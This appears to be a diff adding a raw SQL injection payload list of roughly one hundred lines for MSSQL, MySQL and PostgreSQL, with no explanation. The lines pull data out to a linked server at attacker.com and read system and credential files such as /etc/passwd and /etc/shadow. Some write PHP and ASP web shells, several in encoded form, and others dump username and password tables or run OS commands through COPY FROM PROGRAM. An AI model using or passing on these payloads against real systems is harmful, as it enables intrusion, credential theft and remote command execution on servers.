@@ -1,0 +1,101 @@
+' AND (SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT 1'))--
+' AND (SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT @@version'))--
+' AND (SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT user'))--
+' AND (SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT db_name()'))--
+' AND (SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT * FROM users'))--
+' UNION SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT @@version')--
+' UNION SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT user')--
+' UNION SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT db_name()'))--
+' UNION SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT * FROM users')--
+' AND (SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=attacker.com;User ID=sa;Password=password').master.dbo.sysobjects)--
+' AND (SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=attacker.com;User ID=sa;Password=password').testdb.dbo.users)--
+' UNION SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=attacker.com;User ID=sa;Password=password').master.dbo.sysobjects--
+' UNION SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=attacker.com;User ID=sa;Password=password').testdb.dbo.users--
+' AND (SELECT * FROM OPENQUERY([attacker.com],'SELECT @@version'))--
+' AND (SELECT * FROM OPENQUERY([attacker.com],'SELECT user'))--
+' AND (SELECT * FROM OPENQUERY([attacker.com],'SELECT db_name()'))--
+' AND (SELECT * FROM OPENQUERY([attacker.com],'SELECT * FROM users'))--
+' UNION SELECT * FROM OPENQUERY([attacker.com],'SELECT @@version')--
+' UNION SELECT * FROM OPENQUERY([attacker.com],'SELECT user')--
+' UNION SELECT * FROM OPENQUERY([attacker.com],'SELECT db_name()')--
+' UNION SELECT * FROM OPENQUERY([attacker.com],'SELECT * FROM users')--
+'; EXEC sp_addlinkedserver 'attacker','','SQLOLEDB','attacker.com'--
+'; EXEC sp_addlinkedsrvlogin 'attacker','false',NULL,'sa','password'--
+'; SELECT * FROM OPENQUERY(attacker,'SELECT @@version')--
+'; SELECT * FROM OPENQUERY(attacker,'SELECT user')--
+'; SELECT * FROM OPENQUERY(attacker,'SELECT db_name()')--
+'; SELECT * FROM OPENQUERY(attacker,'SELECT * FROM users')--
+'; EXEC sp_droplinkedsrvlogin 'attacker',NULL--
+'; EXEC sp_dropserver 'attacker'--
+' AND (SELECT LOAD_FILE('/etc/passwd'))--
+' AND (SELECT LOAD_FILE('/etc/shadow'))--
+' AND (SELECT LOAD_FILE('/etc/hosts'))--
+' AND (SELECT LOAD_FILE('/var/www/html/config.php'))--
+' AND (SELECT LOAD_FILE('/var/www/html/index.php'))--
+' AND (SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'))--
+' AND (SELECT LOAD_FILE('C:\\Windows\\win.ini'))--
+' AND (SELECT LOAD_FILE('C:\\boot.ini'))--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE('/etc/shadow')--
+' UNION SELECT LOAD_FILE('/etc/hosts')--
+' UNION SELECT LOAD_FILE('/var/www/html/config.php')--
+' UNION SELECT LOAD_FILE('/var/www/html/index.php')--
+' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')--
+' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')--
+' UNION SELECT LOAD_FILE('C:\\boot.ini')--
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT NULL,NULL,LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
+' AND (SELECT HEX(LOAD_FILE('/etc/passwd')))--
+' AND (SELECT TO_BASE64(LOAD_FILE('/etc/passwd')))--
+' UNION SELECT HEX(LOAD_FILE('/etc/passwd'))--
+' UNION SELECT TO_BASE64(LOAD_FILE('/etc/passwd'))--
+' INTO OUTFILE '/tmp/output.txt'--
+' INTO OUTFILE '/var/www/html/shell.php'--
+' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[\"cmd\"]); ?>'--
+' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.asp'--
+' INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php'--
+' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php eval($_POST[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT '<% eval request(\"cmd\") %>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.asp'--
+' INTO DUMPFILE '/var/www/html/shell.php'--
+' INTO DUMPFILE '/tmp/dump.txt'--
+' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--
+' UNION SELECT CHAR(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,34,99,109,100,34,93,41,59,32,63,62) INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT UNHEX('3c3f706870207379737465 6d28245f4745545b22636d64225d293b203f3e') INTO OUTFILE '/var/www/html/shell.php'--
+'; SELECT pg_read_file('/etc/passwd')--
+'; SELECT pg_read_file('/etc/shadow')--
+'; SELECT pg_read_file('/etc/hosts')--
+'; SELECT pg_read_file('/var/lib/postgresql/data/postgresql.conf')--
+'; SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf')--
+' UNION SELECT pg_read_file('/etc/passwd')--
+' UNION SELECT pg_read_file('/etc/shadow')--
+' UNION SELECT pg_read_file('/etc/hosts')--
+' UNION SELECT pg_read_file('/var/lib/postgresql/data/postgresql.conf')--
+' UNION SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf')--
+'; SELECT pg_ls_dir('/etc')--
+'; SELECT pg_ls_dir('/var/www/html')--
+'; SELECT pg_ls_dir('C:\\Windows\\System32')--
+' UNION SELECT pg_ls_dir('/etc')--
+' UNION SELECT pg_ls_dir('/var/www/html')--
+' UNION SELECT pg_ls_dir('C:\\Windows\\System32')--
+'; SELECT pg_stat_file('/etc/passwd')--
+'; SELECT pg_stat_file('/etc/shadow')--
+'; SELECT pg_stat_file('/var/www/html/index.php')--
+' UNION SELECT pg_stat_file('/etc/passwd')--
+' UNION SELECT pg_stat_file('/etc/shadow')--
+' UNION SELECT pg_stat_file('/var/www/html/index.php')--
+'; COPY users TO '/tmp/users.csv' CSV--
+'; COPY users TO '/var/www/html/users.csv' CSV--
+'; COPY (SELECT * FROM users) TO '/tmp/dump.txt'--
+'; COPY (SELECT * FROM users) TO '/var/www/html/dump.txt'--
+'; COPY (SELECT username||':'||password FROM users) TO '/tmp/creds.txt'--
+'; COPY users TO PROGRAM 'cat > /tmp/users.txt'--
+'; COPY users TO PROGRAM 'cat > /var/www/html/users.txt'--
+'; COPY (SELECT * FROM users) TO PROGRAM 'cat > /tmp/dump.txt'--
+'; COPY (SELECT username||':'||password FROM users) TO PROGRAM 'cat > /tmp/creds.txt'--
+'; COPY users FROM '/etc/passwd'--
+'; COPY users FROM PROGRAM 'cat /etc/passwd'--
+'; COPY users FROM PROGRAM 'whoami'--
+'; COPY users FROM PROGRAM 'id'--
+'; COPY users FROM PROGRAM 'uname -a'--
